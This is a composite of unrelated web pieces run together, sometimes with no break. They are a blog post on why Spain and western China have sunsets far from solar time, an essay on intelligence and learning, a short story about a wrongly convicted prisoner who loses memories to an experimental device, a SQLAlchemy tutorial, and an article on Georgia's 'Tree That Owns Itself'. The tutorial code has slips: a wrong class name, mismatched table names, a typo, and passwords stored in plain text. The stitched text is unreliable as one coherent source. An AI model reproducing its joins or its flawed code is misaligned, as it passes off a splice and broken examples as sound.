<p>At the time I’m writing, near the winter solstice, Madrid’s sunset is around 17:55, <strong>more than an hour later</strong> than the sunset in, for example, Naples, which is at a similar latitude. The same difference holds at the summer solstice and around the year. Just because it applies to most places I’ve been, a time like that in Naples feels more natural to me, and probably to most non-Spanish people. But is it?</p>

<p>Looking for other regions of the world having the same peculiarity of Spain, I edited a <a href="http://commons.wikimedia.org/wiki/File:Standard_time_zones_of_the_world_(2012)_-_Pacific_Centered.svg">world map from Wikipedia</a> to show the difference between solar and standard time. It turns out, there are many places where <strong>the sun rises and sets late in the day</strong>, like in Spain, but not a lot where it is very early (highlighted in red and green in the map, respectively). Most of Russia is heavily red, but mostly in zones with very scarce population; the exception is St. Petersburg, with a discrepancy of two hours, but the effect on time is mitigated by the high latitude. The <strong>most extreme</strong> example of Spain-like time is western China: the difference reaches three hours against solar time. For example, today the sun rises there at 10:15 and sets at 19:45, and solar noon is at 15:01.</p>

<p>So, why do some countries are forced to have such discrepancies? The only way to assign to a place a <strong>canonical time</strong> which follows our main assumptions is to observe the instant in the day when the Sun is higher in the sky, and call that 12:00. This is <strong>not practical</strong> for at least two important reasons.</p>

<figure>
 <div>
  <p><a href="http://blog.poormansmath.net/images/analemma-sun.jpg">
   <img src="http://blog.poormansmath.net/images/thumbnail_150_analemma-sun.jpg">
  </a></p><figcaption>
    Analemma of the sun
  </figcaption>
 </div>
</figure>

<p>One is that (solar) <strong>days do not all have the same length</strong>: the modern calendar compensates by letting midday oscillate a bit around the year: for example, midday in Naples goes from 11:47 in early November to 12:17 in early February. The difference between solar noon and clock noon is beautifully explained by an analemma, a picture with an exposure taken every few days at clock noon, showing how the sun moves in the sky not only in height (the north-south) direction due to the different seasons, but also in the east-west direction due precisely to the different lengths of the solar days.</p>

<p>More importantly, <strong>each city at a slightly different longitude would have a slightly different time</strong>. It seems strange that time systems with such a huge problem had ever been practical, but in the pre-industrial-revolution world, travels were so uncommon and slow that this problem was no more than a minor annoyance. But in today’s hyper connected (physically and virtually) world, it is obviously not an option.</p>

<p>The transition from apparent solar time, where all days have different lengths, to solar mean time, where midday wanders around 12:00, was caused by the proliferation of <strong>mechanical clocks</strong> in the early 19th century. The change to a time zone system, to solve the second problem, was caused instead by the telegraph and even more by the spreading of <strong>railway networks</strong> in the second half of that century; it’s not a coincidence that the first country moving to a common time was Great Britain.</p>

<p>Indeed, if we acknowledge that the two problems must be solved, the natural result is the current <strong>time zone system</strong>. The immediate consequence is that in the western part of the time zone the sun rises and sets later than in the eastern part. Normally, these differences amount to at most half an hour in either direction, but <strong>human geography</strong> sometime forces greater differences. In Spain’s case, to allow Spain to have the same time as central Europe, the difference can exceed ninety minutes. China instead decided in 1949 to adopt a single time zone, and to place its center in the richer east, forcing the less populated west to have an uncomfortable time. Indeed, though not officially recognized by the government, people in Xinjiang (China’s west-most region) follow a time zone closer to their apparent solar time, shifted by two hours from Beijing time.</p>

<p><strong>Note:</strong> luckily, the map was uploaded on Wikipedia as SVG, so it was simply edited with a text editor to add the gradients (using Inkscape to match the objects with their ids). I do not usually like cylindrical projections (my favourite is <a href="http://en.wikipedia.org/wiki/Robinson_projection">Robinson</a>’s, and yes, <a href="http://xkcd.com/977/">I like coffee</a>), but this time it made drawing gradients so much easier. And the <a href="http://en.wikipedia.org/wiki/Miller_cylindrical_projection">Miller</a> is a fair enough compromise.</p>

<h2><span id="What_is_intelligence.3F">What is intelligence?</span></h2>
<p>In humans, <b><a href="https://supermemo.guru/wiki/Intelligence" title="Intelligence">intelligence</a></b> is a measure of the ability to <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">solve problems</a>.
</p>
<h2><span id="What_determines_intelligence.3F">What determines intelligence?</span></h2>
<p>Human intelligence depends on (1) innate qualities, (2) upbringing and (3) knowledge. 
</p><p><b>(1)</b> The <b>Genetic component</b> of intelligence is most apparent in the difference between humans and apes (see: <a href="https://supermemo.guru/wiki/Pleasure_of_communication" title="Pleasure of communication">Pleasure of communication</a>), however, it is far less prominent in a healthy human population. Some personality traits may have a greater impact on the ultimate intelligence than the actual innate brain processing power.
</p><p><b>(2)</b> <b>Upbringing</b> plays a crucial role in human intelligence. It should primarily be understood as the period when future intelligence can be undermined by disease, abuse, neglect and/or by limits on freedom. For healthy children, love and <a href="https://supermemo.guru/wiki/Optimization_of_behavioral_spaces_in_development" title="Optimization of behavioral spaces in development">free access to rich environments</a> is usually a sufficient condition for developing high intelligence.
</p><p><b>(3)</b> <b>Knowledge</b>: Given a basic genetic endowment and a healthy modern upbringing, most differences in adult human intelligence can be explained by learning and learning habits. There is also an important component of the interaction between the brain, the personality, and the environment. Some high-potential individuals get trapped in a set of <a href="https://supermemo.guru/wiki/Behavioral_system" title="Behavioral system">behavioral systems</a> that result in stagnation that may be hard to escape.
</p><p>Human intelligence has self-amplifying powers that may be undercut (1) internally by a pathology (or aging), or (2) externally by limits on freedom, esp. <a href="https://supermemo.guru/wiki/Free_learning" title="Free learning">freedom of learning</a> (e.g. <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>).
</p>
<h2><span id="Universal_intelligence_is_elusive">Universal intelligence is elusive</span></h2>
<p>In healthy adults, intelligence is a domain-specific problem solving capacity. The concept of innate universal intelligence is a myth. A highly knowledgeable individual may show a spark of genius across many domains and come close to the sense of universal intelligence. We may use the term, a <b>Renaissance (wo)man</b> or a <b>polymath</b> in reference to such a person. Wide learning may provide an illusion of universal intelligence. This seemingly universal intelligence often runs in families. This may be explained by family culture, personality traits, and only to a minor degree by genes associated with the actual processing power of the brain.
</p><p>As much as there is no universal intelligence, there is no universal IQ test. All tests will depend on prior knowledge, interests, exposure, culture and other biases. Howard Gardner proposed the concept of <a href="https://en.wikipedia.org/wiki/Theory_of_multiple_intelligences">multiple intelligences</a>, where neurophysiological modalities may determine a preference for a specific type of cognitive processing. His thinking can be extended to all aspects of human knowledge where domain-specific training leads to the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of domain-specific intelligence. In other words, there are as many intelligences as there are intelligent human brains. Correlations that lead to the concept of <a href="https://en.wikipedia.org/wiki/G_factor_(psychometrics)"><i>g factor</i></a> are all rooted in cross-domain transfers (e.g. in a set of positive feedback loops, learning may affect sleep, circulation, neurogenesis, mood, etc.).
</p><p>As much as there is no universal problem solving capacity, there is no universal problem solving test (see: <a href="https://supermemo.guru/wiki/PISA_fuels_the_education_arms_race" title="PISA fuels the education arms race">PISA refocuses on problem solving</a>). This extends to artificial intelligence. We cannot dismiss a state-of-the-art system on the grounds that <i>"all it can do is play Go"</i>. It is true that we still struggle to produce an artificially intelligent system that would show universal <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> sufficient for the <a href="https://supermemo.guru/wiki/Emergence" title="Emergence">emergence</a> of highly applicable <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> when immersed in any domain. However, once we arrive there, we will still need to train the system in specific domains to call it truly intelligent.
</p>
<h2><span id="How_does_aging_affect_intelligence.3F">How does aging affect intelligence?</span></h2>
<p>In a healthy adult, domain-specific problem solving capacity will usually follow a curve in which there is an ascent in youth and a decline at older ages. The shape of that curve is determined by the balance of gains and losses. Gains are usually associated with learning, esp. learning via problem solving. Losses are mostly associated with health, esp. metal health, or neglect. As intelligence is a self-perpetuating quality, those who gain intelligence early may continue thriving into a very old age. On rare occasions, the effects of aging can be entirely compensated by lifelong learning, even in <a href="https://supermemo.guru/wiki/How_fast_does_memory_decline_with_age%3F" title="How fast does memory decline with age?">octogenarians and beyond</a>.
</p>
<h2><span id="Intelligence_prescription">Intelligence prescription</span></h2>
<p>The above reasoning leads to a simple formula for high intelligence:
</p>
<p>To maximize intelligence, we should focus on maximizing the acquisition of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">high-quality knowledge</a></p>
<p>The term <i>high quality</i> stands here primarily for <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">coherence</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a> (see: <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">Abstract knowledge</a>).
</p><p>The above formula is universal and hermetic. It dispenses of the problem of the starting point, which will often differ vastly between individuals. It carries an important optimistic message that accelerates progress: <b>there are few innate obstacles to high intelligence</b>.
</p>
<h2><span id="How_can_we_make_populations_more_intelligent.3F">How can we make populations more intelligent?</span></h2>
<p>Immense progress could be achieved if adults could eliminate only two factors: (1) <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a> and (2) <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">sleep</a> problems. As personality traits are set, escaping from toxic human environments may also play a role for a large proportion of the population. Millions of people fail to live up to their potential due to being suppressed by their work environment or even family. Work environments must be friendly and families must thrive on love. Without those preconditions, achieving high intelligence is difficult. The balance of gains and losses may be negative or insufficiently positive. In addition, for a large proportion of children, the chances for growth are stunted by <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Schools often promote bad learning habits, loss of self-reliance and unhealthy social environments. One of the best predictors of future high intelligence is a well-established and intense <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">childhood passion</a>.
</p><p>There is nothing wrong with striving at genius. See my <a href="https://supermemo.guru/wiki/Genius_checklist" title="Genius checklist">Genius checklist</a> for some hints. In short, if you are unhesitantly involved in passionate problem solving associated with perpetual learning, you can rest assured: you are on the ascending curve towards high intelligence. All you need to remember is to shelter your efforts from possible disruptions to this self-empowering status quo.
</p>
<h2><span id="Intelligence_vs._knowledge">Intelligence vs. knowledge</span></h2>
<p>Stable knowledge and new knowledge play key roles in intelligence. For details see: <a href="https://supermemo.guru/wiki/Knowledge_in_creative_problem_solving" title="Knowledge in creative problem solving">Knowledge in creative problem solving</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>5:58 am</em><br><em>May 16, 2040 AD</em><br><em>State Correctional Institute Greene, Pennsylvania</em></p><p>It’s not every day, you are wrongly accused of murder and then sent to the best-facilitated prison in the country that hosts the most dangerous of the criminals. To think that others now thought I was a dangerous criminal as well was unsettling. The first person who died after I arrived at the ‘Correctional Institution’ was a 49-year-old Chinese-American named Li Wei. She had been there for 21 years for killing her teacher and would probably have been there for more but she had given up her right to appeal and had requested execution. After the initial shock had passed, I tried staying away from the other inmates. Forming attachments in a prison wasn’t a good idea. The way I saw it, they could be executed at any time.</p><p>“Count time. Turn the light on and stand at the door.” The loudspeakers came on as usual at 6 a.m. A few minutes later, breakfast trays were handed through the bars of the cell doors.</p><p>Today I was allowed in the unit’s law library. The two hours were never enough to gather enough information. Searching through the legal databases sitting in a cubicle using an old-fashioned computer from the year 2020 was enough to give anyone a headache and I was nowhere near prepared for my appeal hearings. When the two hours were up, I was led to my cell. What I wouldn’t do to get my old life back.</p><p>It was difficult to grasp how I had gone from being a bookworm holed in my apartment 24/7 to being accused of murdering a police officer. It would be years before I was proven innocent and another year before I was let out. To think I got here because of a glitch in the system’s face recognition system. They were willing to let a young innocent girl die rather than admit that there was something wrong with their technology. Having been here a month already and nowhere close to gathering enough information to prove my innocence, I had lost faith in God and the system. I had resigned myself to this cruel fate that God had handed me in a battered and dented platter.</p><p><em>Please let me find something to prove my innocence.</em></p><p>God must have heard my prayers because two days later members from the SCITECH arrived promptly at 11 in the afternoon.</p><p>Hearing the whispers from the others, I had already gathered that they were here to find volunteers to try out their newest technology because who better to try out your newest ‘technology’ on than the prisoners who had appealed for execution. Even if something went wrong, they would die anyway. If the technology worked, it’s all the better for them. We were nothing but <em>lab rats</em> to them. My lips curled in distaste. I wasn’t interested in being a lab rat. The technology wasn’t something you could rely on 100%. My current situation was a testament to that.</p><p>They were rounding the halls twisting their words to gather volunteers. I had lost interest in them and was playing chess by myself until they stood in front of my cell. There were three of them. The one in the middle seemed like he was the spokesperson. The other two were murmuring in the background.</p><p>“As you may have already gathered — ”</p><p>“Not interested.” I interrupted. He looked shocked as if a prisoner would dare to interrupt him while he was speaking. I couldn’t care less if he was offended.</p><p>“It could help you clear your name.”</p><p>I slowly turned my head to the side. It was one of the guys that had been murmuring in the background before. But his words caught my attention.</p><p>“Excuse me? Clear my name? Exactly what is it that you want to test?”</p><p>I should have known better than to meddle with technology after everything that happened. But proving my innocence by becoming a lab rat seemed like a sweet deal at the time. But I was wrong like I had been wrong about everything else in my life.</p><p>10 minutes.</p><p>That’s all the time I have. 10 minutes until I lose the remaining of my memories. Until I lose myself. Until I rid myself of this pain.</p><p>Until I die.</p><p>600 seconds.</p><p>599…598…597…</p><p>Memories were supposed to last forever. Even when the moment had long passed and the tears had long dried. Even when the jokes were long said and laughter had long faded. But fate had dealt me with a cruel hand. It had left me with a fragment of my soul.</p><p>555…554…553…</p><p>The technology was supposed to have worked. Instead, M-mry had backfired. The device itself was small and the process simple. Put on the small headset that came with a remote-like device. Type in the year and select what you wanted to backup. I had chosen high school because I didn’t have fond memories of that time. Instead of backing my memories up, it had deleted it from the main server. From my brain, it had stolen 4 years of my precious memories. Ones that I would never get back. Rafe had promised it would work but of course, he had lied. After he had seen the initial interest and curiosity in my eyes, he had used everything and said everything he could to get me to volunteer. And like a desperate idiot I was, I had believed every word he had said about how M-mry would free me by proving my innocence. I could remember every word he had said he was watching me with his chips blue eyes unwaveringly whenever he spoke.</p><p>“<em>The technology is new and it’s the prototype but we are sure that it works. Simply put, it’s a way to back up your memory. If it works, your ideas would not be lost even when you died. If you suddenly had Alzheimer’s disease, then you would still have a way to access your memories. Hypothetically, M-mry could prove your innocence by looking through your memories.</em>”</p><p>And when I had been unsure and close to backing out, he had used the one thing that was most important to me: My family.</p><p>“<em>M-mry is your only hope of proving your innocence. If it works, you will able to leave and see your family whenever you want. You could hug them and live freely. Be able to marry and have kids one day. Otherwise, who knows, maybe even in 20 years you will still not have proved your innocence.</em>”</p><p>That had been enough for me to sign my name on the thick document that protected SCITECH in case something did go wrong. And something went wrong indeed. Not only had I lost my memories of high school but now I had no way of getting them back.</p><p>480…479…478…</p><p>I didn’t think the memories I thought useless and unimportant when forgotten would feel as if I had lost a piece of my soul.</p><p>460…459…458…</p><p>Two weeks ago I gave up my right to appeal and asked for my execution. The new memories living in this prison would never replace the old memories and I was never going to get out of here even if I stayed here 40 years being on my best behavior.</p><p>355…354…353…</p><p>I never thought I would end up here.</p><p>250…249…248..</p><p>With the barest of memories.</p><p>110…109…108..</p><p>I thought that when I died, I would at least die as myself.</p><p>30…29…28…</p><p>I didn’t think I would die a shadow of my former self.</p><p>10…9…8…</p><p>I didn’t think I would die, a stranger.</p><p>3…</p><hr><p><em>Edited by <a href="https://instagram.com/cherrywine_stains" title="Mrk (cherrywine_stains) Instagram Profile" rel="nofollow">cherrywine_stains</a></em></p></div></div>]]>

October 24, 2020 | https://leportella.com/sqlalchemy-tutorial/ | <a href="https://web.archive.org/web/*/https://leportella.com/sqlalchemy-tutorial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><a href="https://leportella.com/sqlalchemy-tutorial/%7B%7Bbase%7D%7D/outreachy-I.html">I’ve been working with Project Jupyter since December of last year</a> and it has been a wonderful experience. The last couple of days I struggled with the SQLAlchemy library that <a href="https://github.com/jupyterhub/jupyterhub">JupyterHub</a> works on its internals. Since I studied this library and had to scratch some <a href="https://stackoverflow.com/">Stack Overflow</a> questions to find some answers, I created this post to help digesting some of my doubts and findings.</p>
<p>Since this post became surprisingly long, I decided that the main problem I was having with SQLAlchemy should be in a separated post. So, keep tuned :)</p>
<p>All code is available <a href="https://github.com/leportella/sqlalchemy-basics-post/">here</a>.</p>
<h2 id="creating-and-understanding-the-engine">Creating and understanding the Engine</h2>
<p>To start workin with SQLAlchemy, the first thing that they taught in the tutorials is to create an Engine. The Engine is how SQLAlchemy communicates with your database, so, when creating the Engine you should add your database (db) URL and that’s basically it.</p>
<p>Although we can access the db through Engine commands (we will see how), we usually don’t. You can, but you shouldn’t :)</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> create_engine

engine <span>=</span> create_engine(<span>'sqlite:///:memory:'</span>, echo<span>=</span>True)
</code></pre></div><p>So, you are just telling where your database currently is located. The attribute <code>echo=True</code> will make SQLAlchemy to log all SQL commands it is doing while you apply commands. This should not be activated in production, ok?</p>
<figure>
    <img src="https://i.imgur.com/0gVcCUg.png" width="200px"> 
</figure>

<p>Once your engine knows your database, it is easy to execute commands on it by using a method called <code>engine.execute(...)</code>. You can see how this is done here:</p>
<figure>
    <img src="https://raw.githubusercontent.com/leportella/sqlalchemy-basics-post/master/gifs/engine_execute.gif" width="450px"> 
</figure>

<p>So you have a two way street: the Engine that knows where your db is and a method (<code>engine.execute(...)</code>) to change the db using the Engine:</p>
<figure>
    <img src="https://i.imgur.com/yjdhaTZ.png" width="200px"> 
</figure>

<h2 id="engine-or-connection">Engine or connection?</h2>
<p>I also saw in some tutorials that you have another way of doing SQL commands through the <code>engine</code> by making a <code>connection</code> such as:</p>
<pre><code>conn = engine.connect()
conn.execute(...)
</code></pre><p>This allows us to create transaction commands, which means that all commands must be done successfully or all should rollback in case of an error [<a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/transactions-transact-sql?view=sql-server-2017">1</a>]:</p>
<div><pre><code data-lang="python">trans <span>=</span> conn<span>.</span>begin()
conn<span>.</span>execute(<span>'INSERT INTO "EX1" (name) '</span>
             <span>'VALUES ("Hello")'</span>)
trans<span>.</span>commit()
</code></pre></div><p>So, actually, the structure looks more like this now:</p>
<figure>
    <img src="https://i.imgur.com/Bcp1Zku.png" width="200px"> 
</figure>

<p>However, looking more deeply <a href="https://stackoverflow.com/a/34364247/3538098">some answers</a> about the differences between <code>engine.execute(...)</code> and <code>connection.execute(...)</code> I found that they are not different at all:</p>
<blockquote>
<p>“Using Engine.execute() and Connection.execute() is (almost) one the same thing, in formal, Connection object gets created implicitly, and in later case we explicitly instantiate it.’’</p>
</blockquote>
<p>So, feel free to use each one of those if you would like :)</p>
<h2 id="creating-and-understanding-sessions">Creating and understanding Sessions</h2>
<p>Until now we connected to our database and were able to execute commands through SQL statements. However, the thing that makes SQLAlchemy so attractive is its ORM, which was not discussed so far.</p>
<p>The ORM must have a <code>session</code> to make the middle-ground between the objects we will deal with in Python and the engine that actually communicates with the database. So, we need a function called <code>sessionmaker</code> that we’ll pass our engine to.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.orm <span>import</span> sessionmaker

Session <span>=</span> sessionmaker(bind<span>=</span>engine)
session <span>=</span> Session()
</code></pre></div><p>So, you will use sessions to talk to your tables and make queries, but is the <code>engine</code> that is actually implementing things on your db.</p>
<figure>
    <img src="https://i.imgur.com/iqV59ky.png" width="300px"> 
</figure>

<p>Although it seems confusing having three entities before even starting with our tables, most of the times after the initial setup you will use the <code>session</code> much more than the <code>engine</code> and <code>connection</code> will be done implicitly by the two firsts, ok?</p>
<h2 id="creating-tables">Creating tables</h2>
<p>Now we want to create tables in our db to work with them and finally start to take a look at SQLAlchemy’s ORM. To create new tables we will create classes that contain attributes. Each class will be a table in our db and each attribute will be a column in this table. To map which table in the db will be related to each class in our files, we will use a SQLAlchemy system called <em>Declarative</em>. To use this, the first thing we must do is to instantiate a <code>Base</code>:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy.ext.declarative <span>import</span> declarative_base

Base <span>=</span> declarative_base()
</code></pre></div><p>Now we create a class <code>User</code> that inherits from our <code>Base</code> declarative. We will create only three attributes to our class: <code>id</code> (which is a primary key and can’t be null), a name and a password. Since we are using <em>Declaratives</em>, we must add at least two attributes: 1) a <code>__tablename__</code> that how your table will be actually called inside the db and 2) at least one Column which is part of a primary key [<a href="https://docs.sqlalchemy.org/en/latest/orm/tutorial.html#declare-a-mapping">2</a>].</p>
<p>We will also add an optional method called <code>__repr__</code> that will be a string that will be returned when we see our user instance.</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'users'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)

    <span>def</span> __repr__(self):
        <span>return</span> f<span>'User {self.name}'</span>
</code></pre></div><p>We now have a class that indicates us how our table must be on our database. However, nothing is changed so far. To actually create the tables on our database, we will need the declarative <code>Base</code> we just created and the <code>engine</code>:</p>
<div><pre><code data-lang="python">Base<span>.</span>metadata<span>.</span>create_all(engine)
</code></pre></div><p>This is when SQLAlchemy will actually do something in our database. Since we have the variable <code>echo</code> set to <code>True</code>, we can see exactly which SQL statement the <code>engine</code> actually did on the database:</p>
<figure>
    <img src="https://i.imgur.com/kU4Snpb.png" width="400px"> 
</figure>

<h2 id="adding-new-records">Adding new records</h2>
<p>Now, we can use the class to create a new record on our database. We can user the <code>User</code> class to create a new user and <code>session.add(...)</code> to add the instance to our database.</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John Snow'</span>, password<span>=</span><span>'johnspassword'</span>)
session<span>.</span>add(user)

<span>print</span>(user<span>.</span>id)  <span># None</span>
</code></pre></div><p>Now, even though we said we needed a primary key, I didn’t pass one for the model. And if I try to print the id of the user I just created, it will return <code>None</code>.</p>
<p>This is because <code>session.add</code> just register the transactions we want it to do, but it doesn’t actually do it [<a href="https://stackoverflow.com/a/4202016/3538098">3</a>].</p>
<p>As explained on <a href="https://stackoverflow.com/a/4202016/3538098">this link</a>, we have two operations that can be done here:</p>
<blockquote>
<p><code>session.flush()</code> communicates a series of operations to the database (insert, update, delete). The database maintains them as pending operations in a transaction. The changes aren’t persisted permanently to disk, or visible to other transactions until the database receives a COMMIT for the current transaction (which is what <code>session.commit()</code> does).</p>
</blockquote>
<p>or</p>
<blockquote>
<p><code>session.commit()</code> commits (persists) those changes to the database. <code>session.commit()</code> always calls for <code>session.flush()</code> as part of it.</p>
</blockquote>
<h2 id="making-queries">Making queries</h2>
<p>Once we have our records on our database, we need to be able to find them :)</p>
<p>So, to the <code>query</code> function of our <code>session</code> we will pass the class we want to look for our instance, an then use the method to filter by an attribute called <code>filter_by</code>.</p>
<div><pre><code data-lang="python">query <span>=</span> session<span>.</span>query(User)<span>.</span>filter_by(name<span>=</span><span>'John'</span>)
</code></pre></div><p>Finally, we pass a method to indicate what we want to do with this query: count the number of records found (<code>.count()</code>), return all records found (<code>.all()</code>), return the first record (<code>.first()</code>) and so on:</p>
<p>Another way is to use the <code>filter</code> method, instead of the <code>filter_by</code>, which has a slightly different syntax:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>==</span><span>'John'</span>)<span>.</span>first()
</code></pre></div><p>With <code>filter</code> method, you can also look for strings similar to what you have:</p>
<div><pre><code data-lang="python">session<span>.</span>query(User)<span>.</span>filter(User<span>.</span>name<span>.</span>like(<span>'%John%'</span>))<span>.</span>first()
</code></pre></div><p>On <a href="https://github.com/jupyterhub/jupyterhub">Jupyterhub</a> they added to each model a <em>classmethod</em> that would simplify this rather complicated syntax. We can add a method that you can pass a <code>session</code>, an attribute, and it returns all the elements, for instance:</p>
<div><pre><code data-lang="python"><span>class</span> <span>User</span>(Base):
  <span>...</span>

  <span>@classmethod</span>
  <span>def</span> <span>find_by_name</span>(cls, session, name):
    <span>return</span> session<span>.</span>query(cls)<span>.</span>filter_by(name<span>=</span>name)<span>.</span>all()
</code></pre></div><p>So, the new way to find all users named only ‘John’:</p>
<div><pre><code data-lang="python">Product<span>.</span>find_by_name(session, <span>'John'</span>)
</code></pre></div><h2 id="creating-new-tables-tables-after-initial-create_all">Creating new tables tables after initial create_all</h2>
<p>On problem I bump into while I was working with <a href="https://jupyter.org/">Project Jupyter</a> was that I needed to create a new table to a database and <code>engine</code> that already had a initial creation (the <code>Base.metadata.create_all(engine)</code>).</p>
<p>So, imagine that now I want a table with Products such as the following:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'products'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
</code></pre></div><p>The simplest way I found to do this was simply:</p>
<div><pre><code data-lang="python">Product<span>.</span>__table__<span>.</span>create(engine)
</code></pre></div><h2 id="creating-a-foreign-key-relationship">Creating a Foreign Key relationship</h2>
<p>Imagine that you would like to connect each product to a user in your system. So, in each instance of <code>Product</code> you would like to store an instance of <code>User</code>:</p>
<figure>
    <img src="https://i.imgur.com/BJqWSMj.png" width="350px"> 
</figure>

<p>If you you are creating all tables now, you should add a Column on your <code>Product</code> class that references the Foreign Key of the user and a relationship with the <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, ForeignKey, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>Product</span>(Base):
    __tablename__ <span>=</span> <span>'product'</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)
    name <span>=</span> Column(String)
    user_id <span>=</span> Column(Integer, ForeignKey(<span>'user.id'</span>))
    user <span>=</span> relationship(<span>'User'</span>)
</code></pre></div><p>And add a relationship between <code>User</code> and <code>Product</code> on <code>User</code> class:</p>
<div><pre><code data-lang="python"><span>from</span> sqlalchemy <span>import</span> Column, Integer, String
<span>from</span> sqlalchemy.orm <span>import</span> relationship

<span>class</span> <span>User</span>(Base):
    __tablename__ <span>=</span> <span>'user'</span>  <span># if you use base it is obligatory</span>

    id <span>=</span> Column(Integer, primary_key<span>=</span>True)  <span># obligatory</span>
    name <span>=</span> Column(String)
    password <span>=</span> Column(String)
    products <span>=</span> relationship(Product, backref<span>=</span><span>"users"</span>)
</code></pre></div><p>Now you can create all tables by using the <code>Base.metada.create_all(engine)</code> we have seen previously.</p>
<p>Now, you can create a user and a product that are related with each other:</p>
<div><pre><code data-lang="python">user <span>=</span> User(name<span>=</span><span>'John'</span>)
product <span>=</span> Product(name<span>=</span><span>'wolf'</span>, user<span>=</span>user)

session<span>.</span>add_all([user, product])
session<span>.</span>commit()
</code></pre></div><p>And that’s it :)</p>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

